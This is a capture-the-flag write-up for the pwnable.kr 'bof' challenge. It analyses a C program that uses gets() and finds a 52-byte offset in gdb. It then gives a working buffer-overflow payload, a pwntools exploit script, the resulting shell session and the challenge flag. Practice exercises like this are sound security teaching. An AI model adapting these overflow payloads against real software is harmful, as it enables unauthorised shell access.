# bof
## Analysis
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                setregid(getegid(), getegid());
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```
We don't know where `overflowme` and `key` is located in runtime, so we use `gdb` for dynamic analysis.
```asm
pwndbg> disassemble func
Dump of assembler code for function func:
   0x000011fd <+0>:     push   ebp
   0x000011fe <+1>:     mov    ebp,esp
   0x00001200 <+3>:     push   esi
   0x00001201 <+4>:     push   ebx
   0x00001202 <+5>:     sub    esp,0x30
   0x00001205 <+8>:     call   0x1100 <__x86.get_pc_thunk.bx>
   0x0000120a <+13>:    add    ebx,0x2df6
   0x00001210 <+19>:    mov    eax,gs:0x14
   0x00001216 <+25>:    mov    DWORD PTR [ebp-0xc],eax
   0x00001219 <+28>:    xor    eax,eax
   0x0000121b <+30>:    sub    esp,0xc
   0x0000121e <+33>:    lea    eax,[ebx-0x1ff8]
   0x00001224 <+39>:    push   eax
   0x00001225 <+40>:    call   0x1050 <printf@plt>
   0x0000122a <+45>:    add    esp,0x10
   0x0000122d <+48>:    sub    esp,0xc
   0x00001230 <+51>:    lea    eax,[ebp-0x2c]
   0x00001233 <+54>:    push   eax
   0x00001234 <+55>:    call   0x1060 <gets@plt>
   0x00001239 <+60>:    add    esp,0x10
   0x0000123c <+63>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x00001243 <+70>:    jne    0x1272 <func+117>
   0x00001245 <+72>:    call   0x1080 <getegid@plt>
   0x0000124a <+77>:    mov    esi,eax
   0x0000124c <+79>:    call   0x1080 <getegid@plt>
   0x00001251 <+84>:    sub    esp,0x8
   0x00001254 <+87>:    push   esi
   0x00001255 <+88>:    push   eax
   0x00001256 <+89>:    call   0x10b0 <setregid@plt>
   0x0000125b <+94>:    add    esp,0x10
   0x0000125e <+97>:    sub    esp,0xc
   0x00001261 <+100>:   lea    eax,[ebx-0x1fe9]
   0x00001267 <+106>:   push   eax
   0x00001268 <+107>:   call   0x10a0 <system@plt>
   0x0000126d <+112>:   add    esp,0x10
   0x00001270 <+115>:   jmp    0x1284 <func+135>
   0x00001272 <+117>:   sub    esp,0xc
   0x00001275 <+120>:   lea    eax,[ebx-0x1fe1]
   0x0000127b <+126>:   push   eax
   0x0000127c <+127>:   call   0x1090 <puts@plt>
   0x00001281 <+132>:   add    esp,0x10
   0x00001284 <+135>:   nop
   0x00001285 <+136>:   mov    eax,DWORD PTR [ebp-0xc]
   0x00001288 <+139>:   sub    eax,DWORD PTR gs:0x14
   0x0000128f <+146>:   je     0x1296 <func+153>
   0x00001291 <+148>:   call   0x12e0 <__stack_chk_fail_local>
   0x00001296 <+153>:   lea    esp,[ebp-0x8]
   0x00001299 <+156>:   pop    ebx
   0x0000129a <+157>:   pop    esi
   0x0000129b <+158>:   pop    ebp
   0x0000129c <+159>:   ret
End of assembler dump.
```

Focus on `gets()` input and the if condition that checks `key == 0xcafebabe`:
```
0x00001225 <+40>:    call   0x1050 <printf@plt>
0x0000122a <+45>:    add    esp,0x10
0x0000122d <+48>:    sub    esp,0xc
0x00001230 <+51>:    lea    eax,[ebp-0x2c]
0x00001233 <+54>:    push   eax
0x00001234 <+55>:    call   0x1060 <gets@plt>
0x00001239 <+60>:    add    esp,0x10
0x0000123c <+63>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
```
The first argument (our input) for `gets` is `ebp-0x2c` (latest push instruction before call). The `key` is `[ebp+0x8]`.

Calculate difference, `0x8 - (-0x2c) = 0x34 = 52 in decimal`.

This means we could write 52 bytes of padding + raw bytes of `0xcafebabe` when given input.
## Solution

For some reason, trying it out in python or pipe payload into `nc` directly from my terminal doesn't work for me. I had to `ssh bof@pwnable.kr -p2222` then inside pipe the payload to `nc pwnable.kr 10003` (`pwnable.kr` / `localhost` / `0` / `127.0.0.1`).

```bash
(ssh)

bof@ubuntu:~$ (python3 -c "import sys; sys.stdout.buffer.write(b'A'*52 + b'\xbe\xba\xfe\xca\n')"; cat -) | nc pwnable.kr 10003
overflow me : /bin/sh: 0: can't access tty; job control turned off
$ ls
bof  flag
$ cat flag
Daddy_I_just_pwned_a_buff3r!
```
Flag: `Daddy_I_just_pwned_a_buff3r!`

---

Failed solution (idk why) but conceptually should work
```py
from pwn import *

p = remote('pwnable.kr',10003)

payload = b'A'*52 + p32(0xcafebabe)
print(payload)

p.sendline(payload)

p.interactive()
```
Output
```sh
❯ python3 solve.py
[+] Opening connection to pwnable.kr on port 10003: Done
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xbe\xba\xfe\xca'
[*] Switching to interactive mode
overflow me : /bin/sh: 0: can't access tty; job control turned off
$ $ ls
$ 
[*] Interrupted
[*] Closed connection to pwnable.kr port 10003
```
```bash
(my own terminal)

❯ (python3 -c "import sys; sys.stdout.buffer.write(b'A'*52 + b'\xbe\xba\xfe\xca\n')"; cat -) | nc pwnable.kr 10003
overflow me : /bin/sh: 0: can't access tty; job control turned off
$ ls
cat flag

^C
```